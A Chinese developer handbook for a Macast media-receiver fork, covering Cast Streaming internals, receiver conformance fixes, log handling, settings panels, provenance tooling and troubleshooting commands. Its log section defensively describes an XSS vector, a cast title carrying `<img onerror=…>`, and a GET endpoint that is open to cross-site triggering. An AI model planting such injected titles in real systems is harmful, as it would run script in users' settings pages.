`_port_suffix()` 兜非数字）。回归用例 **Part 23**：把**我们自己的 DLNA 接收端**（`protocol.DLNAProtocol().call()`）当最严格的 SOAP/DIDL 校验器用 —— 它真的 lxml 解析并解嵌 DIDL，所以"我们发的东西连自己都不认账"这类问题在打桩测试里也能被抓出来。**v0.6 的第二条 Chromecast 通道 = Cast Streaming（`caststream`，设置页里的「Chromecast 低延迟（实验 · 此通道无声音）」—— 它的提示必须同时说出"电视不认这一通道时自动回落兼容通道，那时是有声音的"**，否则用户第一次听到声音就会来报标签是假的：这一条正是这么来的）**：
      完全不走 HTTP、不发 `LOAD`、没有 SDP —— deviceauth → CONNECT → LAUNCH(`0F5096E8`) →
      `urn:x-cast:com.google.cast.webrtc` 上的 OFFER → ANSWER 给一个 UDP 端口 → UDP 上发
      RTP(12B) + Cast 头(7B)。红线全在这几条：① **`LAUNCH_ERROR` 就是能力探测**，收到就
      回落 `cast`/LOAD 通道，握手放在 ffmpeg 与 HTTP 服务**之前**，所以回落不需要拆摊子
      （`handed` 标志决定 sink 归谁，被 generation 打断时也要 `_cleanup(..., sink)`）；
      ② **纯 Python AES-128-CTR ≈1.3 MB/s 才是码率天花板**（`CAST_STREAM_MAX_BITRATE`
      4.5 Mbps，不是网络问题），所以这条通道**主动降级并写进菜单提示**，别当"低延迟免费"；
      ③ 加密是**每帧一次**（per-frame nonce：frame_id 大端放 counter block 的字节 8..12 再
      XOR `aesIvMask`），**切片在加密之后**，反过来就解不开；④ **x264 `-tune zerolatency`
      会把一帧切成多个 slice（实测 720p 10 片）**，访问单元只能按 `first_mb_in_slice==0`
      （NAL 头后第一字节最高位，ue(v) 0）判起，一个 NAL 一帧 = 电视上永远只有 1/10 张图；
      ⑤ **`-aud` 是 AVOption 不是 ffmpeg 开关**，必须写 `-aud 1`，否则它把下一个选项当成
      自己的值吃掉（症状：`Unable to parse "aud" option value` 然后把参数串当输出文件名）；
      x264 参数名是 `min_keyint` 不是 `i-frame-min`，**写错只打一行 error 然后静默忽略**；
      ⑥ 媒体 socket **bind 但不 connect**（connected socket 会被内核丢掉电视从自己端口发的
      checkpoint），收 RTCP 按 `peer[0] == 电视 IP` 过滤；RTCP 长度字段 = **含 4 字节头的
      总字数 -1**（CAST 块 16 字节体 ⇒ 4，写 3 会永远读不到确认，12 帧窗口填满后一直丢帧）；
      ⑦ 12 帧在途窗口满就**丢整帧**并置 `awaiting_key`，PLI 后只等 IDR，kickstart 只在空闲时
      重发最新未确认帧的最后一包，**没有重传路径**（设计如此）；teardown 顺序
      encoder → EOF → drain → CLOSE transport → STOP(sessionId) → CLOSE receiver-0，
      保活 PING 5 秒、20 秒无 PONG 判死并回调 `_stream_lost`。**这套字段全部是从 openscreen
      转写来的，没有任何一条见过真电视**（Part 24 的假设备与发送端共用同一张表，只能证明自洽，
      见 §4.9）；真机验证 = `scripts/cast_streaming_probe.py`。回归用例 **Part 24**：
      OFFER/ANSWER 形状、AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头、切片与序号回绕、
      SR/NTP、`parse_rtcp`（PLI/checkpoint/nack/CST2/复合包）、8 位帧号扩展、多 slice 访问单元、
      真 sockets 上打完整个握手并对打到丢帧窗口与回落路径。 |

回归用例：Part 14（外部播放器 / 小窗 / yt-dlp 两种模式）、Part 15（钩子）、
Part 16（中继对打 Macast 自己的 Chromecast 接收端）、Part 17（RAOP 监督）、
Part 21（屏幕镜像：假 ffmpeg + 自家 Cast 接收端对打，真 HTTP 实时流；v0.3 的一键
BlackHole 路径全部打桩——CoreAudio/下载/安装器都不被触碰，纯测编排与降级）、
**Part 22（v0.4：两种封装、重播不对称、每会话凭据、播放页、采集预设与菜单）**、
**Part 23（v0.5：伪装成文件的字节账本 + 真 HTTP 语义（HEAD/206/恰好 n 字节/416/重连同偏移）、
SSDP 发现与设备描述、SOAP 发送序列（喂给自家接收端校验）、档位回退与看门狗、端到端镜像与菜单）**、
**Part 24（v0.6：Cast Streaming —— AES 与 `/usr/bin/openssl` 逐字节对齐、19 字节头与切片、
RTCP 读法、多 slice 访问单元，以及对打到真 TLS + 真 UDP 的自家假设备：握手、在途窗口、
checkpoint 解锁、PLI、回落 LOAD、teardown 顺序）**、
**Part 25（本地文件投屏 v0.1：ffprobe 决策表逐条（含理由文案）、stdlib Range/206 服务的真 HTTP
语义（200 不带 `Content-Range`、HEAD、206、416、消失的文件）、会增长的转码文件与其长度/码率
回退、自家假 Cast 设备上的 LOAD/媒体账本/`QUIT_APP`（含接收端侧 ledger 被清）、DLNA 侧
`SetAVTransportURI` + 断点 `Seek` + SOAP 的 UTF-8 长度、播放列表自动连播、抢占看门狗的重试预算
与认输、音轨/字幕选择与 sidecar WebVTT、avfoundation 真实设备表、菜单与页脚）**、
**Part 27（按模块独立日志：claim 路由/去重复/幂等、记录只落一处、log-modules/log/log-download/
clear-log 的 module= 面与门控、每次启动清空）**、
**Part 28（模块设置面板：分组与中文标签、无枚举插件的空卡片、set-value 的类型与归属校验、
以及四条"标签表没有和仓库漂移"的守卫用例）**、
**Part 29（屏幕镜像 v0.7+v0.9 一键设置：步骤机不回退/跳过不进分母/fail 压过晚到的 leave、五态判定
逐条排优先级（capturable > loaded > on-disk > stale-receipt > absent，含"见证者抛异常不许往上冒"）、
四条安装分支各指名其步（健康机跳过、残留记录重装、密码取消如实报），外加 v0.9 那两条**反循环**断言：
"盘上有驱动"这一支必须**既不下 pkg 也不 `open`**（meta/download/verify/install/wait 全是 skipped，
note 里不许出现"重启一次"当第一答案），"CoreAudio 有 / ffmpeg 没有"这一支**不重装也不重载**、
照样建聚合设备、结尾必须说"麦克风"并且 `probe` 是 fail 而不是一个绿色的收尾；
另有 `_wait_for_blackhole` 必须回答"哪个见证者看见了"（`loaded` 不等于成功）、
`_SetupProgress` 的进度归属按调用方给的 step 走、sha 不匹配不开安装器、
崩溃只 fail 在跑的那一步、cask API 兜底带来源标签、pkgutil/HAL glob 两个探针分开问、osascript 重载
走管理员授权、进度页真 HTTP 凭据（对 token 200、错/缺 403、nosniff/no-store、不含管理令牌）、
worker 收尾（finish→busy 清→页面限期保留）、`.app` 的 plist 必须声明 `NSMicrophoneUsageDescription`）**、
**Part 26（AirPlay 镜像接收：rc 文件的引号/消毒/「用户附加项排在末尾所以能覆盖」/值不带前导 `-`、
`log_event` 整张表含两种断开拼写与"chatter 不算事件"、POSIX 上 `os.isatty(read_fd)` 证明挂的是 pty、
PATH 上放假 uxplay 走完 启动→连接→断开→停止→reload 全生命周期（断言 argv 只有 `-rc`、没有 `-p`、
`$UXPLAYRC` 全程为空、用户的 `~/.uxplayrc` 前后逐字节不变）、找不到二进制时的编译配方、
自己退出时上报最后一条 error、被替换的实例的 reader 保持沉默、与内置 AirPlay 接收端共存只提示一次）**、
**Part 35（镜像控制台搬进设置页：页面读的 HTTP 端点、`macast/mirror_view.py` 里"显示什么"的派生规则、
页面与后端共享的拼写 —— 三者各在**决定它的那一处**测；页面里没有可调用的 Python，所以它那半份契约按文本测）**、
**Part 36（菜单栏自己的内容：删 Tk 控制台曾把 `build_app_menu()` 换成 `[]`，状态栏图标于是**根本没有菜单**，
而在此之前没有任何用例构造过它 —— 现在建真的顶层并说出该有什么：服务开关、播放行、打开设置页、重投历史，
以及"不许出现电脑投屏行"这条用户裁定）**、
**Part 37（实时链路自己的算术：队列能含多少流、丢弃允许切在哪、电视在拿到 URL 前被喂多久的空、
没动过设置的安装选哪个编码器 —— 2026-09-23 那三条"延迟大/有杂音/不开硬件编码看不见"全是这一文件里的数字与位置，
所以在这里量，不去辩论）**、
**Part 38（采集开了却一帧不回的这一格：噪声过滤、"没有返回画面"的每一格必须给出门和重启、
弃掉音频口的两种采集形状（avfoundation 改 `screen:none` 且不动缓存的探测、pulse 整口删掉而不碰
`:0+0,0`）、对打到真 HTTP 的"降级成功"与"彻底失败"两条路径，以及**页面上那句话**（会话自己的
`audio_dropped()` 优先于探测缓存：弃声时「系统声音」行不再说「已启用」，状态行挂上标记））**。
测试用的是假二进制（PATH 上放个 shell 脚本），所以跑测试不需要 yt-dlp / VLC / shairport-sync / ffmpeg / uxplay。

### 4.9 Cast 接收端一致性：打桩测试永远抓不到的那一类

这一族问题的共同点是**我们没有崩、日志也没有 ERROR，只是发送端不认账**。
`verify_cast_airplay.py` 把网络全部打桩，`vlc_sender_sim.py` 只复刻 VLC 的状态机，
所以两者都抓不到；能抓到的是 `scripts/cast_conformance.py`（跑真实 pychromecast 栈）。
举证时的 pychromecast 版本是 **14.0.10**（就在本仓库 `.venv` 里）。

| 症状 | 真因 | 修复要点 / 用例 |
|---|---|---|
| 发送端调音量**卡 10 秒然后抛 `RequestTimeout`**（HA 音量条、mkchromecast 音量键） | `SET_VOLUME` 只改播放器，**从不回复** `RECEIVER_STATUS`；pychromecast 的 `ReceiverController.set_volume()` 在 `WaitResponse(REQUEST_TIMEOUT=10.0)` 里等这条回复才返回 | `_on_receiver` 的 `SET_VOLUME` 改完状态后 `_send_receiver_status(sock, src, requestId)`。Part 18 前 4 条 |
| 音量条永远 100%、静音状态读不到 | `RECEIVER_STATUS.volume` 与 `MEDIA_STATUS.volume` 都硬编码 `{"level":1.0,"muted":False}`；发送端按**我们报的值** ±0.1 算下一档 | 存 `_volume`/`_muted`，两处 status 都回真值 |
| mkchromecast 的 `--hijack` **每 5 秒重投一次** | `applications[].displayName` 回了 `"Macast"`，而真机对 `CC1AD845` 一律回 `"Default Media Receiver"`，发送端把别的名字当成"接收端被抢了" | `DEFAULT_MEDIA_APP_NAME` |
| 播完了手机还一直显示"正在播放" | `GET_STATUS` 只要有 media 描述就回 `PLAYING`，**永不**降级 | `set_state_*` 观测 + `_observed_state()`；结束带 `idleReason`（FINISHED / ERROR / CANCELLED） |
| 刚 LOAD 完就把新视频判成 `CANCELLED` | LOAD 换片之后 mpv 才补发**旧文件**的 `end-file reason=stop` | `_note_stopped` 只采信"当前媒体已经报过播放"的终止事件；ERROR 例外（换片只会以 stop 结束） |
| mDNS 不可用时发送端**认不出** Macast | `ssdp_udn` 带了 `"uuid:"` 前缀，而 pychromecast 用 `UUID(udn.replace("-",""))` 解析、**整个 `device_info` 返回 None** | `_eureka_info` 发裸 UUID |
| 每次发现都多一次失败请求 | `capabilities` 里缺 `multizone_supported`，而 pychromecast 在 `device_info` 存在时缺省为 **True** → 去探 `https://host:8443/...?params=multizone` | 显式 `multizone_supported: false` |

两个记录下来的操作细节：

- **`Chromecast.set_volume` 在 pychromecast 14 里不存在**（`volume_up()` 自己调用它会
  AttributeError，是上游的 bug）。要复现接收端音量路径，得用
  `cast.socket_client.receiver_controller.set_volume(...)`——那才是走 `WaitResponse` 的那条。
- **本机跑真机验证不要碰用户配置**（§10）：`SETTING_DIR` 是 import 时由 appdirs 算出来的常量，
  所以在 `import macast` **之前**把 `appdirs.user_config_dir` 指向临时目录，日志和设置
  就都落在临时目录里了。示例见本轮验证用的 `/tmp/macast_tempconf.py` 那种写法。
- **探针要用的测试流必须支持 Range**：`http.server.SimpleHTTPRequestHandler` 不支持，
  mpv 会在 seek/prefetch 时 `end-file reason=error`、`file_error='no audio or video data played'`
  （和 §6 里 ffmpeg 那条是同一个坑）。`cast_conformance.py` 自带一个最小 Range handler。

### 4.10 日志：三处叠加的膨胀（外加一个注入面）

2026-09 在一台跑了 49 分钟的实例上实测：`macast.log` **10809 行 / 1.35 MB**
（≈27 KB/分钟 ≈ 1.6 MB/小时 ≈ 40 MB/天），而设置页一打开日志面板就把整份文件吃进 DOM。
三个原因叠在一起，只改其中一个都不够：

| 层 | 原因 | 现在 |
|---|---|---|
| 写文件 | 根 logger 用 `logging.FileHandler`（无轮转）；CherryPy 还往**同一个文件**再挂一个不轮转的 handler | 根 logger 换成 `RotatingFileHandler(2 MB × 2 份)`；`log.access_file` / `log.error_file` 留空 |
| 重复写 | `cherrypy.access` 的记录**同时**被 CherryPy 自己的 handler 和根 handler 各写一遍 —— 每行请求出现两次（实测 2 × 2621 行 ≈ 文件的 **64%**） | 去掉 CherryPy 自己的 handler，记录仍经 propagate 落到根 handler（因此才继续有轮转） |
| 读日志 | `/api?query=log` 用 `f.read()` 回整份；前端 `v-html` 把它塞进 DOM（10.5k 个 `<br/>`） | 接口只回末尾 N 行（`?tail=` / `?all=1`，默认 2000 行 / 512 KB），前端 `<pre>{{ }}</pre>` 文本渲染，且切到面板才拉 |

**红线（改动前先读这几条）：**

- **`log.access_file` 必须留空，且只在这个前提下才安全**：CherryPy 的 logger 会 propagate 到
  根 logger，请求日志才继续落在 `macast.log` 里（带轮转）。谁要是给它们设了 `propagate = False`，
  请求日志就**静默消失**——不再有第二份兜底。Part 20 用一条真实记录守着这个前提。
- **日志正文永远不要用 `v-html`**：日志里含**发送端提供**的 DIDL `dc:title` / URL
  （`protocol.py` 会把整段 `CurrentURIMetaData` 打进去），局域网里任何一台设备投一个带
  `<img onerror=…>` 的标题，打开设置页就会执行。现在是 `<pre>{{ macast_log }}</pre>`。
- **清空走 POST**（`clear-log`，loopback/令牌门控）：GET 版会被任意网页用 `<img>` 触发。
  `log-download` 是 GET，所以它和 `log`/`status` 一样在管理门控名单里（Part 20 有用例）。
- **尾部读取必须 `errors='replace'` 并丢掉切出来的半行**：窗口边界必然落在多字节字符中间，
  严格解码会抛 `UnicodeDecodeError`。
- **每次启动由 `clear_env()` → `remove_log_files()` 删掉 `macast.log` 和轮转出的 `.1/.2`**：
  只删日志本身会让旧备份永远留着。

### 4.10b 按模块独立日志（`macast/logsplit.py`，Part 27）

镜像/投屏这类高频插件如果往共享的 `macast.log` 里按帧打日志，核心协议的行会被淹掉。
`logsplit.claim(name)` 给一个 logger 挂上 `logs/<Name>.log`（`RotatingFileHandler`，1 MB × 1 份）
并把 `propagate` 关掉——**记录只落在自己的文件里，绝不进 macast.log**，这条"恰好一处"就是全部设计。

- **认领发生在插件导入时**：`macast.py` 的 `load_from_file` 与 `_load_bundled_plugins`
  两条路径都调 `logsplit.claim_from_module(module)`（看模块顶层的 `logger` 属性）。
  给新插件加独立日志**不需要**改 logsplit，只要它的 logger 是模块级 `logger`。
- **`clear_env()` 同时调 `logsplit.remove_all()`**：启动时清空 `logs/`，与 macast.log 同语义。
- **API 四个端点全部在管理门控名单里**（本机 / HTTPS / 令牌）：`query=log-modules` 列表、
  `query=log&module=<名>` 尾部读取（`整体` 也接受，等价于不带 module）、
  `log-download&module=`、`clear-log` 带 `module=` 字段。不带 module 的 `log` 仍是 macast.log。
- **页面日志面板是下拉切换**（默认「整体日志」），模块行显示文件大小；模块文件被清空后
  选择器自动回落。**红线不变：日志正文永远 `<pre>{{ }}</pre>`，模块日志同样不许 `v-html`。**

### 4.11 「模块设置」面板：配置键的归属（`macast/module_settings.py`，Part 28）

设置页新 tab「模块设置」把持久化配置**按所属模块分组**展示（核心 / 播放器 / 每个已加载插件 /
其他（未归类）），让普通用户知道每个键是谁的。红线与坑：

- **归属表只写在 `module_settings.py`，不散在各插件里**：`CORE_LABELS` / `PLAYER_LABELS` /
  `PLUGIN_LABELS`（按插件文件基名索引）给出中文标签与提示。**不要**改成"扫描插件的
  `SettingProperty` 枚举成员"——枚举别名规则会让 value 相同的成员（如 `PlayerHW_Disable = 0`）
  把 `PlayerSize_Small` 吞成别名，归属会悄悄错。Part 28 用四条漂移用例（仓库全量扫描
  "实际被持久化的键 ⊆ 标签表"、幽灵标签、core 表==枚举、player ⊆ 枚举）代替枚举扫描。
- **扫描"被持久化的键"只认 `Setting.get/set/has/unset(SettingProperty.X` 第一参数**；
  裸引用可能是值比较（mpv.py:602 `!= SettingProperty.PlayerHW_Disable`），`.value` 结尾的是常量。
- **给插件加新的持久化键时，必须同步往对应标签表加条目**，否则漂移用例当场变红。
  没写枚举的老安装副本不会被显示幽灵键（标签 ∩ 实际加载的枚举）。
- **读写都在门控内**：GET `query=module-settings` 返回分组，POST `set-module-setting`
  （`_MANAGEMENT_PARAMS`）改值/删值；拒绝无归属的键；list/dict 值只读（引导去「高级设置」JSON）。
- 由此 raop 升到 **v0.2**：新增 `RAOP_Device_Name`（覆盖 shairport-sync 服务名，缺省仍跟随
  DLNA 友好名），这是它第一个自己的持久化配置。

### 4.12 署名与来源：`scripts/provenance.py` + `docs/Provenance.md`（Part 34）

本仓库是 fork，所以"这段代码是谁写的"是一句**会被读者读到**的陈述。
已定的做法只有一条：**度量，然后按度量结果只加不减**。用户提的"去掉 fork 与所有原项目
信息"这一半不做（细节见 `docs/Provenance.md` §0）。

- **别拿文件头当来源证据，也别拿 `git blame` 单独当证据。** 头标记的是当初的意图：
  `macast/discovery.py`、`protocol_cast.py`、`protocol_group.py`、`protocol_airplay.py`、
  `scripts/verify_cast_airplay.py` 挂着上游的头，blame 却说 0 行是上游的（代码早被重写干净）。
  反过来 blame 也会说谎：**从别的仓库粘进来的文件**（`macast/plugins/**` 来自
  `xfangfang/Macast-plugins`）在本仓库历史里没有祖先，粘贴那条提交会被当成作者 ——
  所以有一份手写的 `VENDORED` 表；**改名/挪位置**同样丢 blame，所以再比 blob SHA
  （<5 行的文件不参与，空文件的 blob 全世界都一样）。
- **vendored 文件禁止盖我们的名**，`ours`/`mixed` 才盖。这是 `problems()` 的第三条规则，
  也是 Part 34 用合成行单独测过的两个方向之一（另一个是"删掉上游声明必红"）。
- **给文件加头是外科手术**：插入点必须留在**顶部连续的注释块**里（§4.5 —— 插件清单只从
  那个块解析，位置歪了插件会静默装不上），而且不能让 docstring 不再是第一条语句。
  `--stamp` 的插入位置由 `notice_index()` 承担，Part 34 既测它、又用**自家解析器**复核
  "盖过名的插件仍被识别"。
- **`macast/ssdp.py` 有第三层**：Coherence 那一支的 MIT 作者群（Tim Potter 等），
  义务主体既不是我们也不是上游，所以**重写掉上游行也不消灭它**（`THIRD_PARTY` 表守着）。
- **台账必须和代码同步**：改完归属就跑 `provenance.py --check --stamp`，再把
  `docs/Provenance.md` 的 `provenance-ledger` 注释行与两张表的数字改成工具算出来的值，
  然后跑套件 —— Part 34 会拿这三处互相比对（漂移当场变红）。它需要完整历史，
  浅克隆会明确报失败而不是假装通过。
- **本机这份克隆就是"明确报失败"的那种**（2026-09-24 实测）：`git cat-file -t
  19879235ef…`（fork 点）报 `could not get object info`，`git log --all` 最早三条是
  `Initial commit` / `First Commit` —— **215 条上游提交的对象根本不在这里**，不是
  `.git/shallow` 那种可以 `--unshallow` 补回来的浅克隆。后果要写明白：
  ① `provenance.py --check` 在这里只输出 `cannot read history`，Part 34 的 6 条用例
  **每次跑都红**，与代码改动无关（本轮三次跑全部如此）；② 因此**这台机器上无法更新台账**，
  改了 `.py` 的归属也就改了 `our_lines`/`upstream_lines`，只能把重算留给有完整历史的克隆
  （判据：`docs/Provenance.md` 的 `provenance-ledger` 行与工具输出一致）。
  **不要**用手算的差值去把文档改到"看起来过"——Part 34 比的是工具输出，不是差值。

### 4.13 设置页的「帮助」与页宽：会被读到的对外文案（`macast/xml/setting.html`，Part 44）

2026-09-24 之前那份帮助是**上游的 FAQ**：它告诉读者 58880 被占时应用会崩溃（不会——
`AutoPortServer` 另绑随机端口并改名 `Macast(0123)`，见 §4.2）、IINA/Web/Live/PotPlayer
要去下载（本仓库 15 个插件全内置，见 §4.8）、以及一个指向别的仓库的 wiki 链接。
**它从来没有被测红过，因为套件里没有任何一条用例会去读那段散文** —— 这正是 §4.2 末条
（假 ffmpeg 抄真工具的格式）的同一族问题：不提问的检查等于通过的检查。

现在 **Part 44 把文案和代码事实双向绑定**：帮助里每一个数字都问两遍，一遍问页面、
一遍问决定它的那处代码（`utils.DEFAULT_PORT`、`protocol_cast.CAST_PORT`、
`protocol_airplay.AIRPLAY_PORT`、`plugins/{renderer,protocol}/` 的目录清点、
`screen_mirror` 的 `OUTPUTS` / `CAST_STREAM_MAX_BITRATE` / `DLNA_PROFILES` /
`DLNA_PREFILL_SECONDS` / `NO_FRAME_SECONDS`、`Macast.py` 的 `LOG_MAX_BYTES` /
`LOG_BACKUP_COUNT`、`protocol.py` 的 `sub_exts` 与 `cast` 分支的 `_token_present()`、
`appdirs.user_config_dir('Macast', 'xfangfang')`）。**所以改这些常量或配置目录时，
Part 44 会红——那是它在做该做的事**：同一趟里把帮助那句话改掉，别改断言。

- **新增一个标签页 = 必须同时写进帮助**。用例把页面的 `<el-tab-pane label>` 列表和帮助
  「一共 N 个标签」下面那张列表**逐字比对**（两边都必须恰好相等），所以漏写会红，
  多写一个不存在的标签也会红。
- **新增一个投屏目标 / 一档兼容档位 / 一个外部程序依赖**，同理要写进对应段落：
  「四种目标各自的脾气」按 `OUTPUTS` 的条数比对，「没有声音」这一句必须**落在低延迟那一条
  bullet 里**（整段文本里出现一次不算通过——曾经就是这么让"哪条没声音"读错人的），
  `raop.py` / `airplay_mirror.py` 监督的 `shairport-sync` / `uxplay` 各有一条比对。
- **帮助是弹层不是标签页**（顶栏「帮助」按钮，`custom-class="macast-dialog help-dialog"`，
  `append-to-body`）。老链接 `?page=4` 仍然打开它，别把这个兼容拆掉。
- **别把会漂移的数字写进散文**：版本、端口、友好名称、投屏地址一律交给 Vue 插值或
  页面自己的表格；帮助里只留"有常量可绑"的数字。

页宽那一半是同一份文件里的另一件事，也是 Part 44 的后半：
**宽度归视口管，不归 CSS 管**（`#app` 不钉固定宽度，只留 `min(1680px, 100%)` 上限 +
`--pad-x` 内边距；卡片网用 `repeat(auto-fill, minmax(min(100%, 380px), 1fr))` 自己填列）。
四条会被静默拆掉的做法，用例各自盯着：

1. **在 `el-dialog` 的属性里写 `width="…px"`** —— 行内样式会盖过响应式层，CSS 赢不了，
   所以宽度必须写在 `.macast-dialog` / `.help-dialog` 规则里（配 `!important`）。
2. **在 `style=""` 里写像素宽**（日志页的两个下拉、插件页的 select 原来都是这样）——
   窄屏直接撑出横向滚动。改成 class + `min(绝对值, 视口百分比)`。
3. **让标题和它下面的表格当两个网格项** —— 网格会把它们排到不同列，读起来像串了位。
   所以 `<h3 class="section">` 必须和它的内容一起待在同一个 `.pane-block` 里。
4. **`#app` 忘了 `box-sizing: border-box`** —— `width: 100%` 加内边距就整页横向溢出。
5. **「电脑投屏」不许用那张网格** —— 这一页会出现哪几张卡由 `mirror_view.py` 按状态决定，块数不固定；
   `auto-fit` 只收**所有行都空**的轨道，所以「3 列网放 4 张卡」必然把最后一张甩成一列加一大片空。
   现在 `.mirror-wrap` 是 `flex-wrap` + `flex: 1 1 420px`，凑不满的那一行自己摊开；
   `pane-wide` 在这里要另写成 `flex: 0 0 100%`（它是网格属性，flex 不认）。
   Part 44 三条用例分别盯着「flex 且没有 `grid-template-columns`」「`1 1 <px>`」和「通栏卡钉死 100%」。

还有一条是**只有真浏览器 + 真截图才会发现的**：Element UI 把 `.el-dialog` 画成白底，
而这份页面把 `color: var(--text)` 挂在 `<body>` 上，于是深色模式下帮助弹层是
**白底压近白字**（`.el-dialog__body` 自带的 `#606266` 只盖住了没被显式着色的 `h1/td/pre`）。
这不是新引入的，是上游 FAQ 时代就有、只是那时没人读它。
现在 `.macast-dialog` 自带 `background: var(--panel)` 与 `color: var(--text)`，
Part 44 盯着这两条规则还在。**教训：改完前端要按 §10 起一个临时配置目录的真实例，
用真浏览器在宽 / 中 / 窄三档看一遍再收工**（打桩套件从不渲染 DOM，看不见这些）。

## 5. 排障手法（比读代码快）

```shell
LOG="$HOME/Library/Application Support/Macast/macast.log"
grep -aE "Cast LOAD|Cast connection|Cast handshake|Chromecast|AirPlay|mDNS|ERROR|Traceback" "$LOG" | tail -60
```

- **"有声音没画面"的第一判据是 `video-reconfig`**：mpv 只在配置视频轨时发这个事件，
  而 MPVRenderer 把 mpv 事件原样写日志。只有 `audio-reconfig` ⇒ 流里没有视频轨（发送端问题）：

  ```shell
  grep -aE "video-reconfig|audio-reconfig|file-loaded|end-file" "$LOG" | tail -30
  ```

- **`Cast LOAD ... contentType=...`** 记录发送端自称要推什么。`audio/*` 就是实锤。
- **问 mpv 到底拿到了什么轨**：从 `pgrep -fl mpv` 取 `--input-ipc-server=` 路径，发 IPC
  `get_property`：`track-list` / `video-codec` / `width` / `height` / `current-vo` / `core-idle`。
  ⚠️ 返回 `{"error":"success"}` 是**成功**，别当失败处理。
- **别把"端口在听"当证据**：`lsof ... LISTEN` + `socket.connect()` 成功都**不能**说明有人
  `accept()`。要区分就真的做一次 TLS 握手。
- **环境里有代理会让本地网络测试假失败**：
  `env -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY <cmd>`。
- **`pingod/Macast` 是私有仓库 —— 所以插件索引（第三方 / 用户自建）对别人是坏的**（本会话先误判成"沙箱不通"，
  三条互相独立的探针才能定性，别再重复这个错误）：
  `gh api repos/pingod/Macast --jq .private` → **true**；匿名
  `https://api.github.com/repos/pingod/Macast` → **404**，而同一请求打公开的上游
  `xfangfang/Macast` → **200**；`https://data.jsdelivr.com/v1/packages/gh/pingod/Macast`
  → **404 "Couldn't fetch versions"`（公开上游回 200 带版本表）。
  jsDelivr / raw 都读不到私有仓库，而 Macast 下载插件时**不带任何凭据**，
  所以设置页的（第三方）插件卡片会照常显示、点下去才失败，症状长得像网络问题。
  **但这一点只影响"从索引装第三方插件"**：第一方 15 个插件已全部内置（`macast/plugins/**`，
  见 §4.8），私有仓库的索引限制**不再影响第一方用户体验**，他们开箱即得。
  实测（2026-09-21，刚推完 v0.8）：**9 个固定链接里只有 5 个还给 200 —— 那是 CDN 在仓库
  还可读时缓存下来的副本，正在逐个过期；私有状态不变，剩下的就一个一个变成 404，等不来。**
  `raw.githubusercontent.com` 在这台机器上是 `000`（只有这个 host 被挡），**这正是当初把
  404 读成"沙箱不通"的原因** —— 判 Reachability 要用上面那三条带**公开对照组**的探针，
  或者直接跑 `scripts/selfcheck.py` 的「=== online plugin index ===」段。
  **决策（2026-09-22 接「将所有插件都内置吧」更新）**：原"保持私有、官方只承诺手动安装"
  的约束适用范围从"全部插件"缩小为"第三方/用户自建插件"—— 空 `plugins/info.json` 与
  设置页「从网址安装」/ 把 `.py` 放进 `~/Library/Application Support/Macast/renderer/`
  （协议插件放 `protocol/`）的入口**保留**，作为第三方插件的手动安装通道。**不要再提
  "改公开 / 另立公开仓库"**，那是已经回答过的选项；要改只能用户提出（详见 §4.6）。
  推送仍然走 `git push git@github.com:pingod/Macast.git main`，推完
  `git update-ref refs/remotes/origin/main <sha>` 让本地 origin 对上。
- **WorkBuddy/CLI 沙箱**：`PYTHONPATH` 被注入 shim，`mkdir(exist_ok=True)` 会抛
  `PermissionError: EEXIST`；`ps` 不可用。一律 `env -u PYTHONPATH`，用 `lsof`/`pgrep` 代替 `ps`。

## 6. scripts/ 里的工具

| 脚本 | 用途 |
|---|---|
| `run-from-source.sh` | 从源码启动（会 unset PYTHONPATH） |
| `verify_cast_airplay.py` | **主验证套件**（2026-09-25 本机实测 1663/1669 通过，红的 6 条是 Part 34 —— 见 §4.12 末条；它随数据规模伸缩：索引清空后，按条目循环的那些用例
不再产出，v0.7.15 时的 1121 条里含有 9 个索引条目各自的用例）：协议逻辑 + 真实 socket 端到端 + mDNS/网卡/插件热插拔 + 内置插件加载 + 插件索引/条目与清单一致性 + 国内镜像开关（Part 5c/7/12）+ 网页投屏入口与令牌门控 + 9 个内置插件（下载器/外部播放器/小窗/钩子/中继/RAOP/屏幕镜像/本地文件投屏/AirPlay 镜像接收）+ Cast 接收端一致性（Part 18）与 8443 HTTPS setup API（Part 19）+ 日志轮转/尾部读取/清空（Part 20）+ 屏幕镜像发送端（Part 21 假 ffmpeg 对打自家 Cast 接收端；Part 22 浏览器目标与采集预设；Part 23 DLNA 电视＝伪装成文件 + 用自家接收端校验 SOAP；Part 24 Cast Streaming 低延迟通道＝自家假设备对打（真 TLS + 真 UDP）；Part 29 一键设置修复 + 分步进度页 + v0.9 的五态判定（盘上有驱动就不再下载、不再开安装器；CoreAudio 有而 ffmpeg 没有 ⇒ 麦克风权限而不是重装））+ 本地文件投屏（Part 25 ffprobe 决策表 + Range/206 服务 + 假 Cast 设备与自家接收端 + DLNA 发送序列）+ 按模块独立日志（Part 27）+ 模块设置面板与归属漂移守卫（Part 28）+ AirPlay 镜像接收（Part 26 假 uxplay 走完生命周期）+ 内置插件的 import 允许面（Part 30：只允许 Macast 自己声明过的包；pyobjc 那条已定性）+ 采集设备探测的输入形状（Part 31：真机 `ffmpeg -list_devices` 逐字输出喂解析器，并扫测试文件自己，不许再出现虚构的带引号无索引设备行）+ 自检脚本与插件的一致性（Part 32：读 `selfcheck.py` 的文本要求它和两个发送端插件**说的是同一套编码器 / 同一批查找目录 / 同一个 mDNS 与 SSDP 目标 / 只读不写用户设置**）+ **端到端冒烟脚本与应用的耦合**（Part 33：`e2e_smoke.py` 是唯一跑真应用的检查，而它的隔离性全靠**字符串**——端口的设置键名、appdirs 打桩、只开 DLNA 的协议表、代理变量名单、它问的 `/api?query=` 键名、`get_status` 的 server 键名。应用侧改个名就会让这些**静默失效**，冒烟照样全绿。所以逐条拿应用源码比对这些字符串，并守住" BOOTSTRAP 里 `import macast` 之前先打桩""不出现 `Setting.set(`""退出码由失败数决定"。这一 Part 是纯文本检查，从不 import 那个脚本）+ **来源与署名**（Part 34：`git blame` 按 fork 点把每个 `.py` 数成 upstream/vendored/mixed/ours 四态，双向守声明 —— 上游行还在就不许没有上游归属，一行都不是我们的就不许有我们的，`macast/ssdp.py` 里那层 MIT 作者群不许消失；再比 `docs/Provenance.md` 的台账行与两张表的数字；并把 `provenance.py` 当模块导入，用合成行证明"删掉上游声明＝报红""最后一行上游代码被重写完＝不再要求上游归属"这两个方向都测得出，另加"插入点必须留在插件清单块内"+ 用**自家解析器**验盖过名的插件仍被识别。三个变异体（删 `protocol.py` 上游头 / 给 `web.py` 盖我们的头 / 删 ssdp 的 MIT 